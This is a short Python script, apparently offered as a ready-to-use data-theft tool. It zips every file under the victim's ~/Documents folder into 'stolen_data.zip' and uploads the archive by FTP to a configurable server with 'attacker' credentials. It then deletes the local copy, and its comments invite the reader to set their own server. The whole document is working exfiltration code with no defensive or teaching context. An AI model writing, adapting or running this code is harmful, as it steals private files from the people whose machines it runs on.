import os
import zipfile
import ftplib
import socket

# Target directory
TARGET_DIR = os.path.expanduser("~/Documents")
ZIP_FILE = "stolen_data.zip"
FTP_SERVER = "192.168.1.100"  # Change to your FTP server
FTP_USER = "attacker"
FTP_PASS = "password"

# Function to create a zip file of target files
def create_zip():
    with zipfile.ZipFile(ZIP_FILE, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, TARGET_DIR))

# Function to upload file via FTP
def upload_file():
    try:
        ftp = ftplib.FTP(FTP_SERVER)
        ftp.login(FTP_USER, FTP_PASS)
        with open(ZIP_FILE, "rb") as f:
            ftp.storbinary(f"STOR {ZIP_FILE}", f)
        ftp.quit()
        os.remove(ZIP_FILE)
        print("File uploaded successfully!")
    except socket.error:
        print("FTP connection failed.")

# Run exfiltration
if __name__ == "__main__":
    create_zip()
    upload_file()
